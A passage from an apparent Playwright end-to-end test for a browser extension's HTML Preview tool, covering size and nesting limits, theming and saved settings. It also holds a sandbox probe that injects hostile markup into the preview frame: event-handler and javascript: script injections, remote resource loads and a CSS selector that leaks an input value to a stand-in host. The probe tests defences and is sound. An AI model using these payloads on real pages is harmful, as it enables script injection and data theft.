      COLLAPSE + '<table>' + fill('<colgroup span="1000">', 200 * 22) + '<tr><td>a<td>b</table>',
    );
    large.tallTable = await timed(COLLAPSE + '<table>' + fill('<tr><td>a<td>b', MI - 200));
    large.styled = await timed(fill('<p style="color:rgb(1, 2, 3);margin:0 0 1px;padding:1px">x</p>', MI - 10));
    large.css = await timed(
      `<style>${fill('.a > .b:hover { color: rgb(1, 2, 3); margin: 1px 2px; background: url(x) }\n', MI - 100)}</style><p class="a">x</p>`,
    );
    // 500 levels and a megabyte of paragraphs inside them: under the limit, drawn
    large.nest500 = await timed('<div>'.repeat(500) + fill('<p>x</p>', MI - 3000));
    // Nesting the parser would take seconds over: refused before it is parsed (a megabyte of <div> took it 100 s).
    const TOO_DEEP = 'HTML nests elements more than 512 levels deep. HTML Preview works with up to 512 levels.';
    for (const [key, unit] of [
      ['deep', '<div>'],
      ['deepSelfClosing', '<div/>'],
      ['adoption', '<b><div></b>'],
      ['reconstruction', '<i><b></i>'],
      ['breakout', '<svg><div/>'],
    ]) {
      large[key] = await timed(fill(unit, MI - 10));
      large[key].refused = (await lineOf('error')) === TOO_DEEP;
      large[key].empty = await (await preview()).evaluate(() => document.body.childElementCount === 0);
    }
    const deepShapes = ['deep', 'deepSelfClosing', 'adoption', 'reconstruction', 'breakout'];
    const shapes = ['wideTable', 'colspans', 'colgroups', 'tallTable', 'styled', 'css', 'nest500', ...deepShapes];
    // Which tables kept their collapsed borders.
    await timed(COLLAPSE + '<table><tr>' + '<td>a'.repeat(1001));
    large.guard = {
      atThousand: await (
        await preview()
      ).evaluate(() => getComputedStyle(document.querySelector('table')).borderCollapse),
    };
    await timed(COLLAPSE + '<table><tr>' + '<td>a'.repeat(1000));
    large.guard.under = await (
      await preview()
    ).evaluate(() => getComputedStyle(document.querySelector('table')).borderCollapse);
    await page.evaluate(
      value => {
        const field = document.querySelector('#html-preview-input');
        Object.getOwnPropertyDescriptor(HTMLTextAreaElement.prototype, 'value').set.call(field, value);
        field.dispatchEvent(new Event('input', { bubbles: true }));
      },
      'x'.repeat(MI + 1),
    );
    await page.getByText('HTML is larger than 1 MB. HTML Preview works with up to 1 MB.').waitFor({ timeout: 5000 });
    large.refused = {
      empty: await (await preview()).evaluate(() => document.body.childElementCount === 0),
      copyOff: await button('Copy HTML').isDisabled(),
    };
    large.after = await timed('<h1>back</h1>');
    Object.assign(timings, large);
    check(
      `${T}: §12 64 Ki and 256 Ki at once, 512 Ki and 1 Mi after the pause; the pathological megabytes all drawn, no task of 3 s (a table over 1 000 columns loses its collapsed borders, one of 1 000 keeps them); nesting over 512 levels refused within a second, before it is parsed; above 1 Mi refused; the page answers after`,
      [large.live64k, large.live256k, large.settled512k, large.max1m, ...shapes.map(s => large[s]), large.after].every(
        t => t.drawn,
      ) &&
        large.settled512k.elapsed >= 300 &&
        [large.live64k, large.live256k, large.settled512k, large.max1m, ...shapes.map(s => large[s])].every(
          t => t.longest < 3000,
        ) &&
        // refused before it is parsed (no node drawn): a second on a free machine, with room for a busy one
        deepShapes.every(k => large[k].refused && large[k].empty && large[k].elapsed < 3000) &&
        large.nest500.nodes > 100_000 &&
        large.guard.atThousand === 'separate' &&
        large.guard.under === 'collapse' &&
        large.refused.empty &&
        large.refused.copyOff &&
        large.after.elapsed < 1000,
      JSON.stringify(large),
    );

    // ---- The theme: the page goes dark, the preview stays the light page a browser shows.
    await show(MAIL);
    const dark = await inDarkTheme(ctx, base, page, async () => {
      const seen = await (
        await preview()
      ).evaluate(() => ({
        mode: document.documentElement.getAttribute('data-mode'),
        background: getComputedStyle(document.documentElement).backgroundColor,
        page: getComputedStyle(document.body).backgroundColor,
      }));
      seen.outer = await page.evaluate(() => document.documentElement.getAttribute('data-mode'));
      await settledShot(shoot, page, 'tool-html-preview-04-mail-dark.png');
      return seen;
    });
    check(
      `${T}: in the dark theme the page is dark and the preview keeps the mail’s own look (not themed)`,
      dark.outer === 'dark' &&
        dark.mode === null &&
        dark.background === 'rgb(255, 255, 255)' &&
        dark.page === 'rgb(244, 244, 246)',
      JSON.stringify(dark),
    );

    // ---- D17: the copied entry opens back into the tool.
    await go('#/start');
    await go('#/tools/html-preview');
    await page.reload();
    await input.waitFor();
    const recent = page.locator('.kit-tool-history-recent');
    await recent.locator('summary').click();
    const entry = recent.locator('.kit-history-entry', { hasText: 'HTML copied' }).first();
    await entry.waitFor({ timeout: 5000 }).catch(() => {});
    const listed = await entry.count();
    if (listed) await entry.getByRole('button', { name: 'Open' }).click();
    await page
      .locator('[data-restored]')
      .waitFor({ timeout: 5000 })
      .catch(() => {});
    await sleep(300);
    const restored = {
      listed,
      kind: listed ? await entry.locator('.kit-history-entry-kind').innerText() : null,
      input: (await input.inputValue()) === MAIL,
      head: await (await preview()).evaluate(() => document.querySelector('.head')?.textContent?.trim() ?? null),
    };
    check(
      `${T}: a copied preview is in the tool’s history as Previewed and opens back into the tool, drawn again`,
      restored.listed > 0 &&
        restored.kind === 'Previewed' &&
        restored.input &&
        restored.head === 'Shop Your order has shipped',
      JSON.stringify(restored),
    );

    // ---- Saved parameters (D21): the width the person chose is written 400 ms after the change; the page opened
    // again shows it, the field empty, and the frame keeps the sandbox and the policy it opened with. Then Fit again
    // (the default: the record goes away) for what follows.
    const stored = () =>
      page.evaluate(
        async () => (await chrome.storage.local.get('toolSettings')).toolSettings?.params?.['html-preview'],
      );
    await chooseWidth('768 px');
    for (let i = 0; i < 25 && (await stored())?.values?.width !== '768'; i++) await sleep(200);
    await go('#/start');
    await go('#/tools/html-preview');
    await page.reload();
    await input.waitFor();
    await page.locator(`${FRAME}[data-rendered]`).waitFor();
    const kept = {
      stored: await stored(),
      width: await page.getByLabel('Width').innerText(),
      frame: Math.round((await frameEl.boundingBox()).width),
      input: await input.inputValue(),
      sandbox: await frameEl.getAttribute('sandbox'),
      policy: await (
        await preview()
      ).evaluate(() => document.querySelector('meta[http-equiv="Content-Security-Policy"]')?.getAttribute('content')),
    };
    check(
      `${T}: Width 768 px chosen, the page opened again — as left, the field empty; the frame’s sandbox and policy as on opening (saved parameters)`,
      kept.width.includes('768 px') &&
        kept.frame === 768 &&
        kept.input === '' &&
        kept.sandbox === SANDBOX &&
        kept.policy === emptyState.policy,
      JSON.stringify(kept),
    );
    await chooseWidth('Fit');
    for (let i = 0; i < 25 && (await stored()) !== undefined; i++) await sleep(200);

    // ---- §7: what opens for a pasted HTML document on the start page (the tools' detect, in the registry's order).
    await go('#/start');
    const startField = page.getByRole('combobox', { name: 'Find a tool or search the web' });
    await startField.waitFor();
    await startField.focus();
    await page.evaluate(text => {
      const data = new DataTransfer();
      data.setData('text/plain', text);
      document.activeElement.dispatchEvent(
        new ClipboardEvent('paste', { clipboardData: data, bubbles: true, cancelable: true }),
      );
    }, '<!doctype html>\n<html><body><p>Pasted page</p></body></html>');
    await page.waitForFunction(() => location.hash.startsWith('#/tools/'), null, { timeout: 5000 }).catch(() => {});
    timings.pastedDocumentOpens = new URL(page.url()).hash;
    check(
      `${T}: §7 a pasted whole HTML document opens the first tool whose detect knows it — Code Formatter (№ 20) before HTML Preview (№ 24)`,
      timings.pastedDocumentOpens === '#/tools/code-format',
      timings.pastedDocumentOpens,
    );
  } finally {
    await clipboard.restore().catch(() => {});
  }

  // ---- The layers under the check, alone, on a page of their own (its console is this check's, not the run's):
  // hostile markup, sheets and inline styles written straight into the frame's document, as if every rule failed.
  const probePage = await ctx.newPage();
  const probeConsole = [];
  probePage.on('console', m => probeConsole.push(`${m.type()}: ${m.text()}`));
  const probeErrors = [];
  probePage.on('pageerror', e => probeErrors.push(String(e)));
  const routedBefore = routed.length;
  const probeCdp = await ctx.newCDPSession(probePage);
  await probeCdp.send('Network.enable');
  const started = new Map();
  const blocked = new Map();
  // `data:` aside: the browser's own media controls draw their icons from data: SVGs (no network, not the content's).
  probeCdp.on('Network.requestWillBeSent', e => {
    if (!e.request.url.startsWith(origin) && !e.request.url.startsWith('data:'))
      started.set(e.requestId, e.request.url);
  });
  // the extension's own files the frame's document asked for (not the network): which, and what became of them
  // (Chrome lets the extension's own scheme past a page's policy: the frame's `img-src 'none'` does not stop
  // `<img src="/icons/icon-16.png">` written straight into it — only the check does; no network either way.)
  const ownFiles = new Map();
  let pageFrame = null;
  probeCdp.on('Network.requestWillBeSent', e => {
    if (e.request.url.startsWith(origin) && pageFrame && e.frameId !== pageFrame)
      ownFiles.set(e.requestId, { url: e.request.url.replace(origin, ''), type: e.type });
  });
  probeCdp.on('Network.loadingFailed', e => {
    if (ownFiles.has(e.requestId)) ownFiles.get(e.requestId).failed = e.blockedReason ?? e.errorText;
  });
  probeCdp.on('Network.loadingFailed', e => {
    if (started.has(e.requestId)) blocked.set(e.requestId, e.blockedReason ?? `failed: ${e.errorText}`);
  });
  try {
    await probePage.goto(`${base}#/tools/html-preview`);
    await probePage.locator(`${FRAME}[data-rendered]`).waitFor();
    pageFrame = (await probeCdp.send('Page.getFrameTree')).frameTree.frame.id;
    await armCanary(probePage);
    // What the frame's window has of the extension's APIs (nothing in it can run to use them anyway).
    const chromeInFrame = await probePage.evaluate(sel => {
      const w = document.querySelector(sel).contentWindow;
      return { chrome: typeof w.chrome, runtime: typeof w.chrome?.runtime?.id, storage: typeof w.chrome?.storage };
    }, FRAME);
    const injected = await probePage.evaluate(
      ([sel, code, file, corpusHtml]) => {
        const doc = document.querySelector(sel).contentDocument;
        // references taken before any content: the corpus names forms `body`, `documentElement`, … (DOM clobbering)
        const root = doc.documentElement;
        const body = doc.body;
        root.setAttribute('data-theme', 'canary');
        const add = html => {
          const holder = doc.createElement('div');
          holder.innerHTML = html; // test code: the check is bypassed on purpose
          body.append(holder);
        };
        const script = doc.createElement('script');
        script.textContent = code;
        body.append(script);
        const own = doc.createElement('script');
        own.src = file; // a file of the package: the page's script-src 'self' would let it run; the sandbox does not
        body.append(own);
        const style = doc.createElement('style');
        style.textContent =
          '@import url(http://css.invalid/import.css); body { background: url(http://css.invalid/style-el.png) }';
        doc.head.append(style);
        const meta = doc.createElement('meta');
        meta.httpEquiv = 'refresh';
        meta.content = '0;url=http://nav.invalid/refresh';
        doc.head.append(meta);
        // The pasted styles, unchecked, as the page applies them: a constructed sheet and CSSOM inline styles.
        const sheet = new doc.defaultView.CSSStyleSheet();
        sheet.replaceSync(
          [
            "@font-face { font-family: Hp; src: url(http://font.invalid/a.woff2) format('woff2') }",
            'p { font-family: Hp; background: url(http://css.invalid/adopted.png); cursor: url(http://css.invalid/c.cur), auto }',
            'ul { list-style: url(http://css.invalid/list.png) } q::before { content: url(http://css.invalid/content.png) }',
            'div { mask-image: url(http://css.invalid/mask.png); border-image: url(http://css.invalid/border.png) 30 }',
            'b { background-image: image-set("http://css.invalid/set.png" 1x); filter: url(http://css.invalid/f.svg#f) }',
            'input[value^="s"] { background: url(http://leak.invalid/s) }',
          ].join('\n'),
        );
        doc.adoptedStyleSheets = [...doc.adoptedStyleSheets, sheet];
        add('<p>font</p><ul><li>list</li></ul><q>q</q><b>b</b><input value="secret">');
        const inline = doc.createElement('span');
        inline.style.backgroundImage = 'url(http://css.invalid/inline-cssom.png)';
        inline.textContent = 'inline';
        body.append(inline);
        add(`<img src="http://img.invalid/inject.png" onerror="${code}">`);
        add(
          `<svg onload="${code}"><use href="http://svg.invalid/s.svg#a"></use><image href="http://img.invalid/svg.png"></image><rect fill="url(http://svg.invalid/p.svg#g)" width="5" height="5"/></svg>`,
        );
        add('<picture><source srcset="http://img.invalid/a.webp"><img src="http://img.invalid/b.png"></picture>');
        add('<video src="http://media.invalid/v.mp4" poster="http://img.invalid/poster.png" autoplay muted></video>');
        add('<audio src="http://media.invalid/a.mp3" autoplay></audio>');
        add(
          '<iframe src="http://frame.invalid/"></iframe><object data="http://object.invalid/x"></object><embed src="http://embed.invalid/x">',
        );
        add(`<iframe srcdoc="<script>${code.replace(/"/g, '&quot;')}</script>"></iframe>`);
        add(
          '<link rel="stylesheet" href="http://css.invalid/a.css"><link rel="preconnect" href="http://preconnect.invalid"><link rel="dns-prefetch" href="//dns.invalid"><link rel="prefetch" href="http://prefetch.invalid/a"><link rel="preload" as="image" href="http://preload.invalid/a.png"><link rel="modulepreload" href="http://modulepreload.invalid/a.js"><link rel="icon" href="http://icon.invalid/i.png">',
        );
        add('<input type="image" src="http://img.invalid/input.png">');
        add('<div style="background:url(http://css.invalid/inline.png);width:10px;height:10px"></div>');
        add('<base href="http://base.invalid/">');
        add(
          '<form action="http://form.invalid/submit" method="post"><input name="q" value="x"><button id="hp-submit">Go</button></form>',
        );
        add(`<a id="hp-js" href="javascript:${code.replace(/"/g, '&quot;')}">js</a>`);
        add(
          '<a id="hp-ping" href="http://ok.invalid/ping-target" target="_blank" ping="http://ping.invalid/">ping</a>',
        );
        add('<a id="hp-top" href="http://nav.invalid/top" target="_top">top</a>');
        add('<a id="hp-self" href="http://nav.invalid/self">self</a>');
        add(`<input id="hp-focus" autofocus onfocus="${code}">`);
        // and the whole corpus, unchecked
        add(corpusHtml);
        return body.querySelectorAll('*').length;
      },
      [FRAME, CANARY, `${origin}/theme-boot.js`, CORPUS.map(e => e.html).join('\n')],
    );
    const inner = probePage.frameLocator(FRAME);
    await inner
      .locator('#hp-submit')
      .click({ timeout: 2000 })
      .catch(() => {});
    await inner
      .locator('#hp-js')
      .click({ timeout: 2000 })
      .catch(() => {});
    const pingTab = await (async () => {
      const before = popups.length;
      await inner
        .locator('#hp-ping')
        .click({ timeout: 2000 })
        .catch(() => {});
      const until = Date.now() + 3000;
      while (popups.length === before && Date.now() < until) await sleep(50);
      const opened = popups[before];
      const url = opened?.url() ?? null;
      await opened?.close().catch(() => {});
      return url;
    })();
    await inner
      .locator('#hp-top')
      .click({ timeout: 2000 })
      .catch(() => {});
    await sleep(1500);
    const probeFrame = await (await probePage.locator(FRAME).elementHandle()).contentFrame();
    const layers = {
      injected,
      canary: await canary(probePage),
      frameCanary: await probeFrame.evaluate(() => window.__hpPwned ?? null).catch(e => `unreadable: ${e}`),
      ownScriptRan:
        (await probeFrame
          .evaluate(() =>
            Object.getOwnPropertyDescriptor(Document.prototype, 'documentElement')
              .get.call(document)
              .getAttribute('data-theme'),
          )
          .catch(() => null)) !== 'canary',
      top: probePage.url() === `${base}#/tools/html-preview`,
      frame: probeFrame.url(),
      pingTab,
      chromeInFrame,
      refused: [...started].map(([id, url]) => `${url} — ${blocked.get(id) ?? 'not refused'}`),
      ownFiles: [...ownFiles.values()],
      routed: routed.slice(routedBefore),
      errors: probeErrors,
    };
    // Every console line explained: what the sandbox or a policy refused.
    const EXPLAINED = [
      /Blocked script execution in 'about:srcdoc' because the document's frame is sandboxed and the 'allow-scripts' permission is not set/,
      /Refused to (load|apply|connect|frame|execute|set)/,
      /violates the following Content Security Policy directive/,
      /Blocked form submission to '[^']*' because the form's frame is sandboxed and the 'allow-forms' permission is not set/,
      /Unsafe attempt to initiate navigation for frame/,
      /Refused to execute the redirect|Refused to refresh/i,
      /Content Security Policy/,
      /Unsafe attempt to load URL \S+ from frame with URL about:srcdoc\. Domains, protocols and ports must match/,
      /Blocked autofocusing on a <\w+> element/,
      /<link rel=modulepreload> has an invalid `as` value/,
      // a file of the extension the unchecked markup asked for (`<img src="x">`, a stylesheet path) that is not there
      /Failed to load resource: net::ERR_FILE_NOT_FOUND/,
      /Can't create a fenced frame\. A sandboxed document can load fenced frames only when/,
    ];
    const unexplained = probeConsole.filter(line => !EXPLAINED.some(re => re.test(line)));
    layers.console = probeConsole.length;
    layers.kinds = [...new Set(probeConsole.map(line => EXPLAINED.findIndex(re => re.test(line))))];
    layers.unexplained = unexplained;
    check(
      `${T}: with the check bypassed (hostile markup, sheets and inline styles written into the frame, and the whole corpus) the sandbox and the policies alone run nothing, load nothing, navigate nothing; every console line is a refusal`,
      layers.canary.pwned === null &&
        layers.canary.messages.length === 0 &&
        layers.canary.local === null &&
        layers.canary.storage === null &&
        layers.frameCanary === null &&
        layers.ownScriptRan === false &&
        layers.top &&
        layers.frame === 'about:srcdoc' &&
        layers.pingTab === 'http://ok.invalid/ping-target' &&
        [...started.keys()].every(id => /^(csp|origin|inspector)$/.test(blocked.get(id) ?? '')) &&
        JSON.stringify(layers.routed) === JSON.stringify(['http://ok.invalid/ping-target']) &&
        layers.errors.length === 0 &&
        unexplained.length === 0 &&
        chromeInFrame.runtime === 'undefined' &&
        chromeInFrame.storage === 'undefined',
      JSON.stringify(layers),
    );
    timings.layers = {
      requests: started.size,
      blockedBy: [...new Set(blocked.values())],
      console: probeConsole.length,
      kinds: layers.kinds,
      chromeInFrame,
    };
  } finally {
    await probeCdp.detach().catch(() => {});
    await probePage.close().catch(() => {});
  }

  // ---- Leave the page where the next module may start.
  await go('#/tools/html-preview');
  await input.waitFor();
  await show('');
  await forgetSavedParameters(page, 'html-preview');
  await go('#/start');
  for (const p of popups) await p.close().catch(() => {});
  await ctx.unroute(SAFE);
  ctx.off('request', onRequest);
  ctx.off('page', onPopup);
  page.off('request', onPageRequest);
  page.off('console', onConsole);
  await cdp.detach().catch(() => {});
};
